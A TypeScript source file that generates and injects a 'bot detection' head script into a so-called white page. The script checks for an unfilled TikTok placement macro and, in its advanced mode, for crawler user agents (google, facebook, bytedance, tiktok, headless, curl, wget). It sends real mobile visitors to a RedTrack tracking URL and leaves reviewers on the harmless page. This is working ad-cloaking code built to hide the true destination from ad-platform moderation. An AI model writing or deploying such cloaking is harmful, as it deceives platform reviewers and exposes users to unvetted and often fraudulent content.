/**
 * Bot Detection Script Builder
 *
 * Generates JavaScript code that checks if traffic is bot/desktop and redirects accordingly.
 * Ported from v2's head-snippet.js with two filtering modes:
 * - params-only: TikTok optimized (checks ppc parameter only)
 * - advanced: Checks both ppc parameter AND user agent patterns
 */

export interface BotDetectionOptions {
  primaryUrl: string;
  fallbackUrl?: string;
  placementParam?: string;
  botPlacementValue?: string;
  delayMs?: number;
}

/**
 * Build bot detection script with ADVANCED filtering (params + user agent)
 *
 * Checks:
 * 1. If ppc=__PLACEMENT__ (unfilled TikTok macro)
 * 2. User agent matches bot patterns
 * 3. If NOT bot AND mobile → redirect to RedTrack
 * 4. Otherwise → stay on white page
 */
export function buildHeadScript(options: BotDetectionOptions): string {
  if (!options || !options.primaryUrl) {
    throw new Error("buildHeadScript requires a primaryUrl");
  }

  const {
    primaryUrl,
    fallbackUrl = primaryUrl,
    placementParam = "ppc",
    botPlacementValue = "__PLACEMENT__",
    delayMs = 50,
  } = options;

  const scriptBody = `(function() {
    try {
        const params = new URLSearchParams(window.location.search);
        const placementValue = params.get(${JSON.stringify(placementParam)});

        const isMobileDevice = () => {
            const ua = navigator.userAgent;
            const matches = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini|Windows Phone|Mobile|Tablet/i;
            return matches.test(ua) || (window.innerWidth <= 768 && window.innerHeight <= 1024);
        };

        const isBotUserAgent = () => {
            const ua = navigator.userAgent.toLowerCase();
            const botPatterns = /bot|crawler|spider|google|facebook|headless|phantomjs|selenium|webdriver|scraper|wget|curl|bytedance|tiktok|prerender|preview/i;
            return botPatterns.test(ua);
        };

        const isBot = placementValue === ${JSON.stringify(botPlacementValue)} || isBotUserAgent();

        if (!isBot && isMobileDevice()) {
            window.location.replace(${JSON.stringify(primaryUrl)});
            return;
        }

        window.setTimeout(() => {
            if (!isBot && isMobileDevice()) {
                window.top.location = ${JSON.stringify(fallbackUrl)};
            }
        }, ${delayMs});
    } catch (error) {
        console.error(error);
    }
})();`;

  return `<script>
${scriptBody}
</script>`;
}

/**
 * Build bot detection script with PARAMS-ONLY filtering (TikTok optimized)
 *
 * Only checks:
 * 1. If ppc=__PLACEMENT__ (unfilled TikTok macro)
 * 2. If NOT bot AND mobile → redirect to RedTrack
 *
 * NO user agent detection (may reduce TikTok drop-off)
 */
export function buildHeadScript_ParamsOnly(options: BotDetectionOptions): string {
  if (!options || !options.primaryUrl) {
    throw new Error("buildHeadScript_ParamsOnly requires a primaryUrl");
  }

  const {
    primaryUrl,
    fallbackUrl = primaryUrl,
    placementParam = "ppc",
    botPlacementValue = "__PLACEMENT__",
    delayMs = 50,
  } = options;

  const scriptBody = `(function() {
    try {
        const params = new URLSearchParams(window.location.search);
        const placementValue = params.get(${JSON.stringify(placementParam)});

        const isMobileDevice = () => {
            const ua = navigator.userAgent;
            const matches = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini|Windows Phone|Mobile|Tablet/i;
            return matches.test(ua) || (window.innerWidth <= 768 && window.innerHeight <= 1024);
        };

        // PARAMS-ONLY: Only check placement parameter, NO user agent detection
        const isBot = placementValue === ${JSON.stringify(botPlacementValue)};

        if (!isBot && isMobileDevice()) {
            window.location.replace(${JSON.stringify(primaryUrl)});
            return;
        }

        window.setTimeout(() => {
            if (!isBot && isMobileDevice()) {
                window.top.location = ${JSON.stringify(fallbackUrl)};
            }
        }, ${delayMs});
    } catch (error) {
        console.error(error);
    }
})();`;

  return `<script>
${scriptBody}
</script>`;
}

/**
 * Inject bot detection script into white page HTML
 *
 * Replaces {{HEAD_SCRIPT}} placeholder or inserts before </head>
 */
export function injectHeadScript(html: string, scriptTag: string): string {
  // First try to replace {{HEAD_SCRIPT}} placeholder (used in templates)
  if (html.includes("{{HEAD_SCRIPT}}")) {
    return html.replace("{{HEAD_SCRIPT}}", scriptTag);
  }

  // Fallback: inject before </head> tag
  if (!html.includes("</head>")) {
    return scriptTag + html;
  }

  return html.replace("</head>", `${scriptTag}\n</head>`);
}
